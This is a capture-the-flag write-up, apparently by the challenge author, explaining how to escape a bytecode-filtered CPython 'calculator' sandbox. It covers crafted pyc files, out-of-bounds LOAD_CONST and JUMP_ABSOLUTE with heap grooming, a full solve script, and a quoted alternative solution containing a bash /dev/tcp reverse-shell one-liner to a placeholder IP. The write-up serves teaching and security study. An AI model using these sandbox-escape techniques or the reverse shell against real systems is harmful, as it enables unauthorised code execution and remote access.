Read the full blog/write-up here:
[https://kmh.zone/blog/2021/02/07/ti1337-plus-
ce/](https://kmh.zone/blog/2021/02/07/ti1337-plus-ce/).

## Initial analysis

> [Texas Instruments](https://twitter.com/themalwareman) just released the
> latest iteration of their best-selling [TI-1337
> series](https://ctftime.org/task/8362): the TI-1337 Plus Color Edition!  
>  
> `nc dicec.tf 31337`  
>  
>
> [ti1337plusce.tar.gz](https://dicegang.storage.googleapis.com/uploads/56468deace244b3bd40da7f590007cdb93a1c99d7c321f061bca2d86e63b846d/ti1337plusce.tar.gz)

The archive file contains everything needed to deploy the challenge:

- A Dockerfile  
- A patch to CPython (the Python interpreter)  
- The script we connect to  
- A fake flag

First, let's take a look at the Dockerfile:

```  
# build: docker build . -t ti1337plusce  
# run: docker run --rm --name ti1337plusce -p 31337:1337 ti1337plusce  
# connect: nc localhost 31337  
# stop: docker kill ti1337plusce  
FROM python:3.9.1-slim  
RUN apt-get update && apt-get install -y socat git build-essential  
WORKDIR /run  
RUN git clone --single-branch --branch v3.9.1 --depth 1
https://github.com/python/cpython.git  
WORKDIR /run/cpython  
COPY patch.diff .  
RUN git apply patch.diff && ./configure --prefix=/opt/python && export COMPILE_SECRET=`tr -dc A-Za-z0-9 < /dev/urandom | head -c 20` && make CFLAGS="-D FROZEN_SECRET=\\\"`tr -dc A-Za-z0-9 < /dev/urandom | head -c 20`\\\" -D COMPILE_SECRET=\\\"$COMPILE_SECRET\\\"" && unset COMPILE_SECRET  
RUN python3 -m pip install colr  
RUN echo 1337:x:1337:1337::: >> /etc/passwd  
COPY ti1337plusce.py /run  
RUN chmod +x /run/ti1337plusce.py && mkdir /tmp/ti1337 && chmod 733
/tmp/ti1337  
COPY flag.txt /flag.txt  
RUN mv /flag.txt /flag.`tr -dc A-Za-z0-9 < /dev/urandom | head -c 20`.txt  
WORKDIR /tmp/ti1337  
EXPOSE 1337  
CMD while :; do socat TCP-LISTEN:1337,fork,reuseaddr,su=1337
EXEC:"/run/ti1337plusce.py"; done  
```

A custom version of CPython is compiled with some randomized secrets passed to
the C preprocessor after applying the patch. The flag is stored in a random
filename, meaning a simple `open('/flag.txt').read()` won't be enough, and
we'll need something closer to arbitrary code execution. Finally, the
`ti1337plusce.py` script is served as an unprivileged user.

You can read the full server file, but I'll give you the gist here:

1. You enter a username, and a directory for that username is created.  
2. You enter a session name. If you choose to restore a session, the contents of the file with the session name in your user directory are loaded into `code`. Otherwise, `code` is an empty string.  
3. You enter input line-by-line, which is appended to `code` and then written to your session file after an empty `input()` call.  
4. Oh yeah, everything is rainbow.  
5. Your code is entered into an interactive session of the patched CPython binary. If the process exits with a non-zero return code, you get the message "Hey, that's not math!" Otherwise stdout from the process is printed.

Finally, `patch.diff` has 2 major changes:

- Code objects belonging to frozen modules (those serialized with [marshal](https://docs.python.org/3/library/marshal.html) and compiled into CPython) have a secret filename (one of the randomized compile-time macros)  
- A large subset of CPython opcodes trigger `exit(1)` when the following condition is fulfilled:

```c  
if (  
   (!getenv("COMPILE_SECRET") || strcmp(getenv("COMPILE_SECRET"),
COMPILE_SECRET)) /* not during compilation */  
   && strcmp(PyUnicode_AsUTF8(co->co_filename), FROZEN_SECRET) /* not a pre-
compiled frozen module */  
   && tstate->interp->runtime->initialized /* interpreter is initialized */  
)  
```

Here's an explanation of each part:

- Since there is some Python code run at the end of compilation, and I want the build to succeed, I set an environment variable, `COMPILE_SECRET`, while compiling. Because of this, leaking a string from the binary and setting the `COMPILE_SECRET` environment variable would be sufficient for bypassing the filter.

- Frozen modules are also executed at the start of the Python REPL, even after the interpreter has been initialized. I used a secret filename for frozen code objects to allow arbitrary bytecode from those modules. Leaking the `FROZEN_SECRET` string and executing a code object with that filename would bypass the filter.

- Before the interpreter is initialized, lots of bytecode is executed in the REPL. Setting that variable to false would also be sufficient for bypassing the filter.

In addition to all the banned opcodes, there are some restricted ones:

```c  
case LOAD_NAME:  
case STORE_NAME:  
case DELETE_NAME:  
case LOAD_GLOBAL:  
case STORE_GLOBAL:  
case DELETE_GLOBAL:  
   if (PyUnicode_AsUTF8(GETITEM(names, oparg))[0] == '_') exit(1);  
```

We can't load, store, or delete variable names that begin with an `_`. Lots of
special stuff in python (like `__builtins__`) starts with an underscore, so
this prevents potential non-calculator trickery.

Now let's look at the opcodes we *are* allowed to use by scrolling through the
[Python docs](https://docs.python.org/3/library/dis.html). I won't list them
all out, but the notable ones are operations on variables (load, store,
delete), math operations (add, divide, multiply, bitwise ops, etc.),
comparison operators (`!=`, `<`, etc.), printing in the Python REPL, and
import statements.

Import statements definitely stick out as dangerous. And with calculator
sessions, we can write to arbitrary filenames to import from! Any self-
respecting CPython nerd knows that an import statement can refer to 3 types of
files: Python source code (`.py`), Python bytecode (`.pyc`), and shared
libraries (`.pyd`, `.so`). <small>I did not know an import statement could
refer to a `.so` in your current directory before this weekend.</small> So a
solver has two options: write a shared object file (which executes machine
code) to read the flag and import it, or make a pyc file that somehow bypasses
the opcode filtering to read the flag and import it.

Note: There's a lot of other analysis you could do and dead ends you'd
probably hit when coming at it blind. I am presenting a highly romanticized
solving experience.

Writing a simple `pwn.so` file seems like significantly less work, so let's
give it a shot.

```  
[kmh@kmh ti1337]$ cat pwn.c  
void PyInit_pwn() {  
	system("cat /flag.*.txt");  
	exit(0);  
}  
[kmh@kmh ti1337]$ gcc pwn.c -shared -o pwn.so  
[kmh@kmh ti1337]$ python3 -c "import pwn"  
cat: '/flag.*.txt': No such file or directory  
```

Looking good!

```  
[kmh@kmh ti1337]$ (cat - && cat pwn.so && cat -) | nc dicec.tf 31337  
Welcome to the TI-1337 Plus CE!  
Enter your username: kmh13377894219885  
1. Start new session  
2. Restore session  
What would you like to do? 1  
Session name: pwn  
You can use variables and math operations. Results of expressions will be
outputted.  
Enter your calculations:  
> > >  
>

[kmh@kmh ti1337]$  
```

Hmmm. `socat` doesn't forward stderr, so let's try it in a local Docker
container.

```  
root@e5f303d23014:~# (cat - && cat pwn.so && cat -) | /run/ti1337plusce.py   
Welcome to the TI-1337 Plus CE!  
Enter your username: kmh13377894219887  
1. Start new session  
2. Restore session  
What would you like to do? 1  
Session name: pwn  
You can use variables and math operations. Results of expressions will be
outputted.  
Enter your calculations:  
> > >  
>  
Traceback (most recent call last):  
 File "/run/ti1337plusce.py", line 54, in <module>  
   f.write(code)  
UnicodeEncodeError: 'utf-8' codec can't encode character '\udca0' in position
40: surrogates not allowed  
```

Turns out since `input()` returns a Python 3 string, which defaults to UTF-8
encoding, it does a fancy
[`surrogateescape`](https://www.python.org/dev/peps/pep-0383/) thing where
bytes that are not valid UTF-8 are transformed from "\xNN" to "\uDCNN". This
is okay because code points U+D800 through U+DFFF are prohibited in UTF-8, as
they are reserved surrogate pairs in UTF-16 and don't refer to actual
characters. But when the session file in the calculator is opened with
`open(name, "w")`, the encoding is UTF-8 without the `surrogateescape` error
handler. Our input needs to be valid UTF-8 to avoid getting a "surrogates not
allowed" error when writing. We now have two options: I continue to pretend
that I knew Python could import `.so` files from the current directory and
pursue an artisinal, hand-crafted shared object that I do not know how to
make, or we dive into the bytecode solution. I'll go with the latter.

You can check out [st98](https://twitter.com/st98_)'s UTF-8 ELF made with NASM
[here](https://gist.github.com/st98/a277c5930ad882e259ff7d2a3a7e32c2).

## UTF-8 pyc files

The same UTF-8 encoding restrictions apply when we're importing pyc files.
Luckily, the file format is much simpler. Let's
[generate](https://docs.python.org/3/library/py_compile.html) a pyc file and
check it out.

```  
[kmh@kmh ti1337]$ echo "a = 1" > pwn.py  
[kmh@kmh ti1337]$ python3 -c 'from py_compile import *; compile("pwn.py",
invalidation_mode=PycInvalidationMode.UNCHECKED_HASH)'  
[kmh@kmh ti1337]$ hexdump -C __pycache__/pwn.cpython-39.pyc  
00000000  61 0d 0d 0a 01 00 00 00  18 af 88 23 4b 3b 38 00  |a..........#K;8.|  
00000010  e3 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|  
00000020  00 01 00 00 00 40 00 00  00 73 08 00 00 00 64 00
|[email protected].|  
00000030  5a 00 64 01 53 00 29 02  e9 01 00 00 00 4e 29 01  |Z.d.S.)......N).|  
00000040  da 01 61 a9 00 72 03 00  00 00 72 03 00 00 00 fa  |..a..r....r.....|  
00000050  06 70 77 6e 2e 70 79 da  08 3c 6d 6f 64 75 6c 65  |.pwn.py..<module|  
00000060  3e 01 00 00 00 f3 00 00  00 00                    |>.........|  
0000006a  
```

Referencing the [marshal
source](https://github.com/python/cpython/blob/v3.9.1/Python/marshal.c) will
be useful here, as pyc files are a header followed by a marshalled code
object. We'll also want to know the basic rules behind UTF-8. UTF-8 encodes
code points ranging from U+0000 to U+10FFFF, but most text you encounter will
fall in the range 0 to 127, which has the same mapping as ASCII. In order to
not inflate the size of files that only contain those characters, UTF-8 is a
variable length encoding and bytes under 128 are interpreted as single bytes.
Bytes outside that range use their upper bits to indicate how many bytes that
follow are part of the same code point. A sequence of bytes `110xxxxx
10xxxxxx` represents a code point up to U+07FF using the `x` bits. `1110xxxx
10xxxxxx 10xxxxxx` and `11110xxx 10xxxxxx 10xxxxxx 10xxxxxx` work the same
way. The relevant information for us is that any byte greater than or equal to
128 must follow another large byte. We'll try to stay under 128 for
convenience.

The first 8 bytes in the file aren't a problem because as they're all under
128. The next 8 can be zeroed out because they are normally used to check
whether a pyc file needs to be regenerated, but we used the `UNCHECKED_HASH`
invalidation mode and Python won't care if they're wrong. Next up should be
our marshalled code object, but for some reason the byte, 0xe3, doesn't match
the `TYPE_CODE` constant in
[marshal.c](https://github.com/python/cpython/blob/v3.9.1/Python/marshal.c#L62)!

```c  
#define TYPE_DICT               '{'  
#define TYPE_CODE               'c'  
#define TYPE_UNICODE            'u'  
```

Closer investigation reveals that there is a `FLAG_REF` bit
[packed](https://github.com/python/cpython/blob/v3.9.1/Python/marshal.c#L953-L954)
into the type value:

```c  
flag = code & FLAG_REF;  
type = code & ~FLAG_REF;  
```

That flag is '\x80' and, fortunately, all the type constants are under 128.
Let's 0 it out for now (change e3 to 0xe3 & ~0x80 = 63) and see if it causes
any issues. And while we're at it, let's trace through the marshal code as we
read the file and unmark all the other marshal types with `FLAG_REF` set. In
this case, that is all of the bytes in the pyc greater than 127, so let's see
what happens:

```  
[kmh@kmh ti1337]$ hexdump -C __pycache__/pwn.cpython-39.pyc  
00000000  61 0d 0d 0a 01 00 00 00  18 2f 08 23 4b 3b 38 00  |a......../.#K;8.|  
00000010  63 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |c...............|  
00000020  00 01 00 00 00 40 00 00  00 73 08 00 00 00 64 00
|[email protected].|  
00000030  5a 00 64 01 53 00 29 02  69 01 00 00 00 4e 29 01  |Z.d.S.).i....N).|  
00000040  5a 01 61 29 00 72 03 00  00 00 72 03 00 00 00 7a  |Z.a).r....r....z|  
00000050  06 70 77 6e 2e 70 79 5a  08 3c 6d 6f 64 75 6c 65  |.pwn.pyZ.<module|  
00000060  3e 01 00 00 00 73 00 00  00 00                    |>....s....|  
0000006a  
[kmh@kmh ti1337]$ python3 -c "import pwn; print(pwn.a)"  
Traceback (most recent call last):  
 File "<string>", line 1, in <module>  
 File "<frozen importlib._bootstrap>", line 1007, in _find_and_load  
 File "<frozen importlib._bootstrap>", line 986, in _find_and_load_unlocked  
 File "<frozen importlib._bootstrap>", line 680, in _load_unlocked  
 File "<frozen importlib._bootstrap_external>", line 786, in exec_module  
 File "<frozen importlib._bootstrap_external>", line 918, in get_code  
 File "<frozen importlib._bootstrap_external>", line 587, in _compile_bytecode  
ValueError: bad marshal data (invalid reference)  
```

Apparently those reference were important... anything with that bit set is
stored by marshal into a references list that can be accessed with `TYPE_REF`
(0x72). There are two reference accesses, at 0x45 and 0x4a, both to index 3.
The 4th reference generated in the original pyc is an empty tuple (`a9  00`),
so let's replace those references with new tuples:

```  
[kmh@kmh ti1337]$ hexdump -C __pycache__/pwn.cpython-39.pyc  
00000000  61 0d 0d 0a 01 00 00 00  18 2f 08 23 4b 3b 38 00  |a......../.#K;8.|  
00000010  63 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |c...............|  
00000020  00 01 00 00 00 40 00 00  00 73 08 00 00 00 64 00
|[email protected].|  
00000030  5a 00 64 01 53 00 29 02  69 01 00 00 00 4e 29 01  |Z.d.S.).i....N).|  
00000040  5a 01 61 29 00 29 00 29  00 7a 06 70 77 6e 2e 70  |Z.a).).).z.pwn.p|  
00000050  79 5a 08 3c 6d 6f 64 75  6c 65 3e 01 00 00 00 73  |yZ.<module>....s|  
00000060  00 00 00 00                                       |....|  
00000064  
[kmh@kmh ti1337]$ python3 -c "import pwn; print(pwn.a)"  
1  
```

Perfect. We can now write this to a session file on the calculator server,
import it, and, by modifying `co_code`, execute arbitrary bytecode.

## Unrestricted bytecode execution

Our bytecode is still limited by the restrictions in the patch. ~~If we want
to do anything useful, like the read the flag, we'll need to either use memory
corruption in the Python interpreter or trigger one of the conditions outlined
in the analysis phase.~~ (I have been proven wrong by justCatTheFish. We'll
carry on regardless.) Both approaches could use the same building blocks, but
the second is much easier so we'll go with that. The basic premise is that the
CPython interpreter (understandably) does very few bounds checks. For example,
look at the `LOAD_CONST`
[implementation](https://github.com/python/cpython/blob/v3.9.1/Python/ceval.c#L1487-L1493):

```c  
#define PyTuple_GET_ITEM(op, i) (_PyTuple_CAST(op)->ob_item[i])  
...  
#define GETITEM(v, i) PyTuple_GET_ITEM((PyTupleObject *)(v), (i))  
...  
case TARGET(LOAD_CONST): {  
   PREDICTED(LOAD_CONST);  
   PyObject *value = GETITEM(consts, oparg);  
   Py_INCREF(value);  
   PUSH(value);  
   FAST_DISPATCH();  
}  
```

`oparg` is read directly from the code object, which we control through the
pyc, so we can theoretically load any object with a pointer in memory if we
know the offset from the `consts` array. `FROZEN_SECRET` is stored inside
`PyUnicodeObject`s in frozen code objects (see patch.diff). If we load one of
those and leak it with `PRINT_VALUE` (the opcode the Python REPL uses for
printing values), we can use it as the `co_filename` property in the
marshalled code object of our pyc and gain access to every opcode.

Let's hop in GDB and pray the offset is consistent! Fortunately, all empty
tuples reference the same Python object, and frozen code objects are
unmarshalled early in CPython's launch, so as long as our consts array is an
empty tuple, the addresses are entirely determined before user code is run and
the offset will stay the same between runs.

First we'll get the address of a frozen function:

```  
gef➤  r -S -i  
Starting program:
/home/kmh/Development/angstromctf/problems/2020/misc/ti1337plusce/cpython/python
-S -i  
Python 3.9.1 (tags/v3.9.1-dirty:1e5d33e, Feb  5 2021, 14:02:33)  
[GCC 10.2.0] on linux  
>>> from _frozen_importlib import module_from_spec  
>>> module_from_spec  
<function module_from_spec at 0x7f75fe544d30>  
```

Then we'll get the address of a pointer to its filename object:

```  
gef➤  p
&((PyCodeObject*)((PyFunctionObject*)0x7f75fe544d30)->func_code)->co_filename  
$1 = (PyObject **) 0x7f75fe534a38  
```

Now we can break at the [opcode evaluation
function](https://github.com/python/cpython/blob/v3.9.1/Python/ceval.c#L918),
where we access the empty tuple object through the `co_names` field and
calculate the number of indices the filename pointer is away from the
`ob_item` array:

```  
gef➤  b _PyEval_EvalFrameDefault  
Breakpoint 1 at 0x5555555ad800: file Python/ceval.c, line 919.  
gef➤  c  
Continuing.  
>>> 1  
[#0] Id 1, Name: "python", stopped 0x562a16f9c640 in _PyEval_EvalFrameDefault
(), reason: BREAKPOINT  
gef➤  p/d (0x7f75fe534a38 -
(long)((PyTupleObject*)f->f_code->co_names)->ob_item)/8  
$2 = -19652  
```

This means that `LOAD_CONST`, when consts is an empty tuple, has a reference
to a `PyUnicodeObject` containing `FROZEN_SECRET` at index -19652. So we need
to execute the bytecode `LOAD_CONST (-19652); PRINT_VALUE`. Unfortunately,
`oparg` is stored as a 4 byte integer, and opcodes only take single byte
arguments, so we will need to use the
[`EXTENDED_ARG`](https://github.com/python/cpython/blob/master/Python/ceval.c#L4055-L4060)
opcode which is [defined
as](https://github.com/python/cpython/blob/master/Include/opcode.h#L115) a
constant greater than 127. We could still maybe figure something out since
UTF-8 doesn't *ban* bytes over 127; it just has special requirements. But
-19652 is 0xffffb33c, and 0xff can never appear in UTF-8. If you reread my
brief encoding explanation or check Wikipedia you'll see that every valid byte
contains a 0 bit.

Fortunately there are mechanisms for storing bytes in memory without inputting
them directly. The simplest is bytestrings:

```  
gef➤  r  
Starting program: /run/cpython/python -S -i  
Python 3.9.1 (tags/v3.9.1-dirty:1e5d33e, Feb  5 2021, 19:35:48)  
[GCC 8.3.0] on linux  
>>> a = b'\xff\xf1\xff\xf3\xff\xf5\xff\xf7\xff\xf9\xff\xfb\xff\xfd\xff'  
gef➤  search-pattern 0xfffdfffbfff9fff7fff5fff3fff1  
[+] Searching '\xf1\xff\xf3\xff\xf5\xff\xf7\xff\xf9\xff\xfb\xff\xfd\xff' in
memory  
[+] In (0x7f857336a000-0x7f857346a000), permission=rw-  
 0x7f8573389979 - 0x7f85733899b1  →
"\xf1\xff\xf3\xff\xf5\xff\xf7\xff\xf9\xff\xfb\xff\xfd\xff[...]"  
 0x7f85733a2559 - 0x7f85733a2591  →
"\xf1\xff\xf3\xff\xf5\xff\xf7\xff\xf9\xff\xfb\xff\xfd\xff[...]"  
```

We can abuse another bytecode operation without bounds checks:
[jumps](https://github.com/python/cpython/blob/master/Python/ceval.c#L3596-L3611).

```c  
#define JUMPTO(x)       (next_instr = first_instr + (x) /
sizeof(_Py_CODEUNIT))  
...  
case TARGET(JUMP_ABSOLUTE): {  
   PREDICTED(JUMP_ABSOLUTE);  
   JUMPTO(oparg);  
   ...  
}  
```

To make this useful, we need our evil bytecode, inputted as a bytestring, to
be at a predictable offset from our code object so we can reliably jump into
it. This is more complicated than finding the offset between the empty tuple
and `FROZEN_SECRET` because it relies on the allocations in code we input.
After banging my head a bit, I realized the
[unmarshalling](https://github.com/python/cpython/blob/master/Python/marshal.c#L1343)
of a code object allocates a `PyBytesObject` for the bytecode, which is the
same object used by bytestrings. I can allocate a bunch of bytestrings with my
evil bytecode:

```  
A0 = b"\x90\xff\x90\xff\x90\xb3\x64\x3c\x46\x00\x53\x00\xff\xff\xff\xff"  
A1 = b"\x90\xff\x90\xff\x90\xb3\x64\x3c\x46\x00\x53\x00\xff\xff\xff\xff"  
A2 = b"\x90\xff\x90\xff\x90\xb3\x64\x3c\x46\x00\x53\x00\xff\xff\xff\xff"  
...  
A97 = b"\x90\xff\x90\xff\x90\xb3\x64\x3c\x46\x00\x53\x00\xff\xff\xff\xff"  
A98 = b"\x90\xff\x90\xff\x90\xb3\x64\x3c\x46\x00\x53\x00\xff\xff\xff\xff"  
A99 = b"\x90\xff\x90\xff\x90\xb3\x64\x3c\x46\x00\x53\x00\xff\xff\xff\xff"  
```

And then free half of them:

```  
del A0  
del A2  
del A4  
...  
del A94  
del A96  
del A98  
```

The allocated bytestrings will be mostly sequential in memory, so the heap
might look like this:

```  
<evil bytecode>  
<chunk in freelist>  
<evil bytecode>  
<chunk in freelist>  
...  
<chunk in freelist>  
<evil bytecode>  
```

Even if there are some intermediate allocations, it is very likely that
another buffer of the same length as our evil bytecode (in this case, 16
bytes) would use a freed chunk in front of one of the buffers we want to jump
into. So if we unmarshal a code object whose `co_code` is 16 bytes long, we
should have a constant offset. The exact value of the offset depends on
metadata and implementation details, but checking in GDB shows it to be 0x40
bytes. After following the allocate/free procedure above and importing a pyc
file with `JUMP_ABSOLUTE (0x40)`, we've successfully leaked `FROZEN_SECRET`:

```python  
import uuid  
import socket  
import re

u = bytes(str(uuid.uuid4()).replace("-", ""), encoding="utf-8")

def run(session, code, option=b"1"):  
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
	s.connect(("dicec.tf", 31337))  
	s.sendall(u+b"\n")  
	s.sendall(option+b"\n")  
	s.sendall(session+b"\n")  
	s.sendall(code+b"\n")  
	r = True  
	output = ""  
	while r:  
		r = s.recv(4096)  
		output += r.decode("utf-8")  
	return output

run(b"a.py", b"1+1\n")  
run(b"b", b"import a\n2+2\n")  
run(b"c.py", b"a = 1337\n")  
run(b"__pycache__/c.cpython-39.pyc", open("payload.pyc", "rb").read()+b"\n")  
leak = run(b"d", b"\n".join('A{} = b"{}"'.format(i,
'\\x90\\xff\\x90\\xff\\x90\\xb3\\x64\\x3c\\x46\\x00\\x53\\x00'+'\\xff'*4).encode("utf-8")
for i in range(100))+b"\n"+b"\n".join("del A{}".format(i).encode("utf-8") for
i in range(0, 100, 2))+b"\n"+b"import c\n")  
frozen = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])').sub('',
leak).split("'")[1]  
print(frozen)  
```

```  
ErBT0ksQUDyGuWIT42Bw  
```

A couple details I skipped over: I created the `__pycache__` folder by
importing a py file (which it turns out isn't necessary since you can import
`pwn.pyc` with `import pwn`) and removed the rainbow ANSI escape codes with a
regex from Stack Overflow.

We can now change `co_filename` to be the leaked string in a pyc file, upload
that as `flag.pyc`, and then do `import flag`. You actually *can't* overwrite
a file in `__pycache__` for this because they automatically fix the name for
you based on the path.

### Another way to leak

[ALLES!](https://twitter.com/allesctf) found another fun way to leak
`co_filename` of a frozen code object (I've dumped their payload from the
server):

```  
>>> dis.dis(marshal.loads(open("jdxvpDpUMSmJhoNpToLJ.pyc", "rb").read()[16:]))  
 1           0 LOAD_CONST               0 (0)  
             2 LOAD_CONST               1 (None)  
             4 IMPORT_NAME              0 (sys)  
             6 STORE_NAME               0 (sys)

 3           8 LOAD_NAME                0 (sys)  
            10 IMPORT_FROM              1 (last_traceback)  
            12 IMPORT_FROM              2 (tb_next)  
            14 IMPORT_FROM              3 (tb_frame)  
            16 IMPORT_FROM              4 (f_code)  
            18 IMPORT_FROM              5 (co_filename)  
            20 STORE_GLOBAL             6 (a)  
            22 LOAD_CONST               1 (None)  
            24 RETURN_VALUE  
```

Turns out
[`IMPORT_FROM`](https://github.com/python/cpython/blob/master/Python/ceval.c#L5666-L5668)
is just `LOAD_ATTR` in disguise!

```c  
static PyObject *  
import_from(PyThreadState *tstate, PyObject *v, PyObject *name)  
{  
   PyObject *x;

   if (_PyObject_LookupAttr(v, name, &x) != 0) {  
       return x;  
   }  
   ...  
```

And it's easy to trigger an exception in a frozen module by importing
something that doesn't exist, which can then be accessed through
`sys.last_traceback`:

```python  
import aa  
from jdxvpDpUMSmJhoNpToLJ import a  
a  
```

Their full solution code is available
[here](https://gist.github.com/OlfillasOdikno/0694e3e38ba75760281c771bd4a9d00a).
I could have prevented this solution by disallowing `IMPORT_FROM`, but then
the inclusion of `IMPORT_NAME` becomes even more contrived, and this is a cool
piece of trivia, so I have no regrets.

## Finishing up

Now that we have unrestricted bytecode execution, it should be as simple as
`import os; os.system("cat /flag-*")`, right? Wrong!

```  
[kmh@kmh ~]$ nc dicec.tf 31337  
Welcome to the TI-1337 Plus CE!  
Enter your username: kmh13377894219885  
1. Start new session  
2. Restore session  
What would you like to do? 1  
Session name: 1  
You can use variables and math operations. Results of expressions will be
outputted.  
Enter your calculations:  
> import os  
>  
Hey, that's not math!  
```

Code in `os` still hits the opcode filtering switch statement. Fortunately,
CPython comes in with a bunch of [modules written in
C](https://github.com/python/cpython/tree/master/Modules) that don't go
through the Python interpreter. One of these is the `posix`, which is what
implements most of the functionality of `os`. Here's the final pyc:

```  
00000000  61 0d 0d 0a 01 00 00 00  00 00 00 00 00 00 00 00  |a...............|  
00000010  63 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |c...............|  
00000020  00 03 00 00 00 40 00 00  00 73 1a 00 00 00 64 00
|[email protected].|  
00000030  64 01 6c 00 5a 00 65 00  09 c3 a0 01 64 02 09 c3  |d.l.Z.e.....d...|  
00000040  a1 01 01 00 64 01 53 00  29 03 69 00 00 00 00 4e  |....d.S.).i....N|  
00000050  7a 04 6c 73 20 2f 29 02  5a 05 70 6f 73 69 78 5a  |z.ls /).Z.posixZ|  
00000060  06 73 79 73 74 65 6d 29  00 29 00 29 00 7a 14 69  |.system).).).z.i|  
00000070  44 52 69 35 4d 77 36 79  58 49 34 58 63 54 48 66  |DRi5Mw6yXI4XcTHf|  
00000080  68 32 41 5a 08 3c 6d 6f  64 75 6c 65 3e 01 00 00  |h2AZ.<module>...|  
00000090  00 73 02 00 00 00 08 01                           |.s......|  
00000098  
```

And the rest of the solve script:

```python  
run(b"e.pyc", open("flag.pyc", "rb").read().replace(b"iDRi5Mw6yXI4XcTHfh2A",
frozen.encode("utf-8"))+b"\n")  
flag = "/flag."+re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])').sub('',
run(b"f", b"import e\n")).split("flag.")[1].split(".")[0]+".txt"  
run(b"g.pyc", open("flag.pyc", "rb").read().replace(b"iDRi5Mw6yXI4XcTHfh2A",
frozen.encode("utf-8")).replace(b"z\x04ls /", b"z"+bytes((4+len(flag),))+b"cat
"+flag.encode("utf-8"))+b"\n")  
print(run(b"h", b"import g\n"))  
```

And, finally, the flag:

```  
[kmh@kmh solve]$ python3 solve.py  
Welcome to the TI-1337 Plus CE!  
Enter your username: 1. Start new session  
2. Restore session  
What would you like to do? Session name: You can use variables and math
operations. Results of expressions will be outputted.  
Enter your calculations:  
> > dice{a_ja1lbr0k3n_calcul4t0r?!}  
```

## All that work was unnecessary...

[justCatTheFish](https://twitter.com/justCatTheFish) blew my mind with this
solution:

```python  
from sys import __dict__ as sysd  
from __main__ import __dict__ as myd  
from posix import system as displayhook; sysd |= myd; 'bash -c "bash -i >&
/dev/tcp/xx.xx.xx.xx/nnnn 0>&1"';  
```

Another clever use of `IMPORT_FROM`! By importing `__dict__` from the main
module (which contains variables you assign) and another module and "or"ing
them, you can write into the namespace of the other module. The function used
to print in the Python REPL is a global in the `sys` module, so changing that
to `posix.system` pops a shell. I'm super happy with this as an unintended
solution and not disappointed at all.

Original writeup (https://kmh.zone/blog/2021/02/07/ti1337-plus-ce/).